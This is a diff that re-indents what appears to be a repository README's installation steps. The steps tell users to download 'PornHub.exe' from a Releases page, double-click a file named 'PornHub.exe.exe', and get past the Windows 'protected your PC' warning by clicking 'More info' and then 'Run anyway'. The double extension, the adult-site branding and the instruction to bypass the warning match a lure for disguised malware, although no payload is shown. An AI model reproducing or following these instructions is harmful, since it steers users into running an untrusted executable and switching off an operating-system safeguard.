@@ -1,20 +1,20 @@
-    Installation
+                     Installation
 
-Download the PornHub.exe file from the Releases page
+       Download the PornHub.exe file from the Releases page
 
-Double-click PornHub.exe.exe
+            Double-click PornHub.exe.exe
 
-If Windows shows a warning (“Windows protected your PC”):
+      If Windows shows a warning (“Windows protected your PC”):
 
-Click More info
+                Click More info
 
-Click Run anyway
+                 Click Run anyway
 
 
-    Requirements
+                  Requirements
 
-Windows 10 or later
+                 Windows 10 or later
 
-At least 4 GB RAM
+                 At least 4 GB RAM
 
-1MB free disk space
+                 1MB free disk space
